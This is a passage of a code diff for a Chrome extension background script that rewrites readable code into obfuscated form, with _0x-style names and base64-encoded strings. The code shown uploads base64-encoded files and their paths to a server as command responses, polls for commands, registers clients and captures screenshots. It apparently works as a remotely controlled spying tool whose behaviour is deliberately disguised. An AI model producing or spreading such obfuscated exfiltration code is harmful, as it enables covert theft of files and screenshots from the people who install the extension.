-        const mimeType = blob.type || 'application/octet-stream';
-        
-        // Send to server
-        await sendCommandResponse(commandId, 'file_download', {
-            fileName: fileName,
-            filePath: filePath,
-            mimeType: mimeType,
-            size: blob.size,
-            sizeMB: fileSizeMB.toFixed(2),
-            data: base64Data
-        }, userId);
-        
-        console.log(`✅ File sent to server: ${fileName}`);
-        
-    } catch (error) {
-        console.error('❌ Error downloading file:', error);
-        await sendCommandResponse(commandId, 'error', { 
-            message: error.message,
-            filePath: filePath 
-        }, userId);
+        await _0xf708(id, _0x1a2b('ZmlsZV9kb3dubG9hZA=='), { fileName: fn, filePath: fp, mimeType: b.type || _0x1a2b('YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt'), size: b.size, sizeMB: sz.toFixed(2), data: b64 }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message, filePath: fp }, uid);
     }
 }
 
-// ============ Helper Functions ============
-function waitForTabLoad(tabId, timeoutMs = 10000) {
-    return new Promise((resolve, reject) => {
-        const timer = setTimeout(() => {
-            reject(new Error('Tab load timeout'));
-        }, timeoutMs);
-
-        chrome.tabs.onUpdated.addListener(function listener(tid, info) {
-            if (tid === tabId && info.status === 'complete') {
-                chrome.tabs.onUpdated.removeListener(listener);
-                clearTimeout(timer);
-                resolve();
-            }
-        });
-    });
-}
-
-function updatePopupStatus(connected) {
+function _0x9092(conn) {
     chrome.runtime.sendMessage({
-        type: 'status_update',
-        connected: connected,
-        serverUrl: SERVER_BASE_URL,
-        clientId: CLIENT_ID,
-        extensionId: EXTENSION_ID
-    }).catch(() => {
-        // Popup not open, ignore
-    });
+        type: _0x1a2b('c3RhdHVzX3VwZGF0ZQ=='), connected: conn, serverUrl: _0x4b2a, clientId: _0x1f3e, extensionId: _0x2d5c
+    }).catch(() => {});
 }
 
-// ============ Message Handling from Popup ============
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-    switch (request.type) {
-        case 'get_status':
-            sendResponse({
-                connected: isConnected,
-                serverUrl: SERVER_BASE_URL,
-                clientName: CLIENT_NAME,
-                clientId: CLIENT_ID,
-                extensionId: EXTENSION_ID
-            });
+chrome.runtime.onMessage.addListener((req, snd, res) => {
+    switch (req.type) {
+        case _0x1a2b('Z2V0X3N0YXR1cw=='):
+            res({ connected: _0x5f7a, serverUrl: _0x4b2a, clientName: _0x3a9b, clientId: _0x1f3e, extensionId: _0x2d5c });
             break;
-
-        case 'register_user':
-            // Store user name
-            USER_NAME = request.userName;
-            chrome.storage.local.set({ userName: USER_NAME });
-            
-            // Re-register with server to update user name
-            registerClient();
-            
-            console.log('✅ User registered:', USER_NAME);
-            sendResponse({ success: true });
+        case _0x1a2b('cmVnaXN0ZXJfdXNlcg=='):
+            _0x4e8d = req.userName;
+            const o = {};
+            o[_0x1a2b('dXNlck5hbWU=')] = _0x4e8d;
+            chrome.storage.local.set(o);
+            _0xd6f7();
+            res({ success: true });
             break;
-
-        case 'connect':
-            CLIENT_NAME = request.clientName || CLIENT_NAME;
-            
-            // Save settings
-            chrome.storage.local.set({
-                clientName: CLIENT_NAME
-            });
-
-            // Restart polling
-            startPolling();
-            sendResponse({ success: true });
+        case _0x1a2b('Y29ubmVjdA=='):
+            _0x3a9b = req.clientName || _0x3a9b;
+            const s = {};
+            s[_0x1a2b('Y2xpZW50TmFtZQ==')] = _0x3a9b;
+            chrome.storage.local.set(s);
+            _0xb4d5();
+            res({ success: true });
             break;
-
-        case 'disconnect':
-            stopPolling();
-            sendResponse({ success: true });
+        case _0x1a2b('ZGlzY29ubmVjdA=='):
+            _0xc5e6();
+            res({ success: true });
             break;
-
-        case 'test_screenshot':
-            captureScreenshot('manual_test');
-            sendResponse({ success: true });
+        case _0x1a2b('dGVzdF9zY3JlZW5zaG90'):
+            _0x192a(_0x1a2b('bWFudWFsX3Rlc3Q='));
+            res({ success: true });
             break;
     }
     return true;
